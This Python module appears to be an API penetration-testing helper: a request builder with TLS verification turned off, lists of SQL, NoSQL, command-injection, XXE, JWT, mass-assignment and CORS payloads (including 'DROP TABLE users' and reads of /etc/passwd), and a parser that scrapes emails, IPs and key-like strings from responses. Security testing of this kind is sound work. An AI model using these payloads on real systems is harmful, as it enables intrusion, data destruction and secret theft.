"""
Request Builder & Payload Generator Utilities
"""

import requests
import json
from typing import Dict, Any, List
import logging

logger = logging.getLogger(__name__)

class RequestBuilder:
    """Build and manage HTTP requests for API testing"""
    
    def __init__(self, base_url: str, timeout: int = 5):
        self.base_url = base_url.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        
    def build_request(self, 
                     method: str,
                     endpoint: str,
                     headers: Dict = None,
                     params: Dict = None,
                     json_data: Dict = None,
                     data: str = None) -> requests.Response:
        """Build and execute HTTP request"""
        
        url = f"{self.base_url}{endpoint}"
        final_headers = headers or {}
        
        try:
            if method.upper() == 'GET':
                return self.session.get(url, headers=final_headers, params=params, timeout=self.timeout)
            elif method.upper() == 'POST':
                return self.session.post(url, headers=final_headers, params=params, json=json_data, data=data, timeout=self.timeout)
            elif method.upper() == 'PUT':
                return self.session.put(url, headers=final_headers, json=json_data, timeout=self.timeout)
            elif method.upper() == 'DELETE':
                return self.session.delete(url, headers=final_headers, timeout=self.timeout)
            elif method.upper() == 'PATCH':
                return self.session.patch(url, headers=final_headers, json=json_data, timeout=self.timeout)
        except Exception as e:
            logger.error(f"Request failed: {e}")
            return None

class PayloadGenerator:
    """Generate various payloads for API testing"""
    
    @staticmethod
    def sql_injection_payloads() -> List[str]:
        """Generate SQL injection payloads"""
        return [
            "1' OR '1'='1",
            "1'; DROP TABLE users; --",
            "1' UNION SELECT NULL,NULL,NULL --",
            "1' AND SLEEP(5) --",
            "admin' --",
            "' OR 1=1 --",
            "1' ORDER BY 10 --"
        ]
    
    @staticmethod
    def nosql_injection_payloads() -> List[Dict]:
        """Generate NoSQL injection payloads"""
        return [
            {"username": {"$ne": None}, "password": {"$ne": None}},
            {"$where": "this.username == 'admin'"},
            {"username": {"$regex": "^admin"}},
            {"$or": [{"username": "admin"}, {"admin": True}]},
            {"email": {"$nin": [""]}}
        ]
    
    @staticmethod
    def command_injection_payloads() -> List[str]:
        """Generate command injection payloads"""
        return [
            "; cat /etc/passwd",
            "| whoami",
            "`id`",
            "$(whoami)",
            "&& sleep 5",
            "| sleep 5",
            "; ping -c 1 127.0.0.1"
        ]
    
    @staticmethod
    def authentication_bypass_payloads() -> List[Dict]:
        """Generate authentication bypass payloads"""
        return [
            {'username': 'admin', 'password': 'admin'},
            {'username': 'admin', 'password': ''},
            {'username': '', 'password': ''},
            {'username': 'admin', 'password': "' OR '1'='1"},
            {'username': "admin' --", 'password': 'anything'}
        ]
    
    @staticmethod
    def jwt_payloads() -> List[Dict]:
        """Generate JWT attack payloads"""
        return [
            {'alg': 'none'},
            {'alg': 'HS256', 'typ': 'JWT'},
            {'sub': 'admin', 'role': 'admin'}
        ]
    
    @staticmethod
    def xxe_payloads() -> List[str]:
        """Generate XXE injection payloads"""
        return [
            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
            <root>&xxe;</root>''',
            '''<?xml version="1.0"?>
            <!DOCTYPE data [<!ELEMENT data ANY>
            <!ENTITY xxe SYSTEM "file:///etc/hosts">]>
            <data>&xxe;</data>'''
        ]
    
    @staticmethod
    def mass_assignment_payloads() -> List[Dict]:
        """Generate mass assignment payloads"""
        return [
            {'username': 'test', 'isAdmin': True},
            {'username': 'test', 'admin': True},
            {'username': 'test', 'role': 'admin'},
            {'username': 'test', 'is_admin': 1},
            {'username': 'test', 'permissions': ['admin', 'delete']}
        ]
    
    @staticmethod
    def cors_payloads() -> List[Dict]:
        """Generate CORS misconfig payloads"""
        return [
            {'origin': 'http://attacker.com'},
            {'origin': 'https://attacker.com'},
            {'origin': '*'}
        ]

class ResultParser:
    """Parse and analyze API responses"""
    
    @staticmethod
    def extract_json(response: requests.Response) -> Dict:
        """Extract JSON from response"""
        try:
            return response.json()
        except:
            return {}
    
    @staticmethod
    def check_vulnerability_indicators(response_text: str) -> List[str]:
        """Check for vulnerability indicators in response"""
        indicators = []
        
        error_keywords = [
            'syntax error', 'sql', 'exception', 'traceback',
            'error', 'failed', 'denied', 'forbidden'
        ]
        
        for keyword in error_keywords:
            if keyword in response_text.lower():
                indicators.append(keyword)
        
        return indicators
    
    @staticmethod
    def extract_sensitive_data(response_text: str) -> Dict[str, List]:
        """Extract sensitive data from response"""
        import re
        
        sensitive = {
            'emails': re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', response_text),
            'ips': re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', response_text),
            'urls': re.findall(r'https?://[^\s<>"{}|\\^`\[\]]*', response_text),
            'api_keys': re.findall(r'[a-zA-Z0-9\-_]{32,}', response_text)
        }
        
        return {k: v for k, v in sensitive.items() if v}
